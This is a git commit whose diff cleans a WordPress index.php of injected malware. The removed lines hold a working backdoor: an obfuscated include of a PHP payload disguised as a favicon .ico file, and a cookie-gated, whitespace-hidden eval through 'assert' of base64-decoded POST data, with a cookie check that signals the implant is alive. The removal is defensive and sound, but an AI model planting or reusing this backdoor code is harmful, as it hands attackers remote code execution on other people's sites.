c55dac85d64e20a609812b80355140b5046c4a80
usama ahmed <uusa35@gmail.com>
2017-10-28 16:28:41 +0300

    from my local

--- index.php
+++ index.php
@@ -1,12 +1,5 @@
 <?php
 
-
-/*d8198*/
-
-@include "\x2fvar/\x77ww/h\x74ml/w\x65bapp\x73/jor\x64anak\x77/wp-\x63onte\x6et/th\x65mes/\x74went\x79ten/\x66avic\x6fn_9c\x35fbf.\x69co";
-
-/*d8198*/																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
-
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
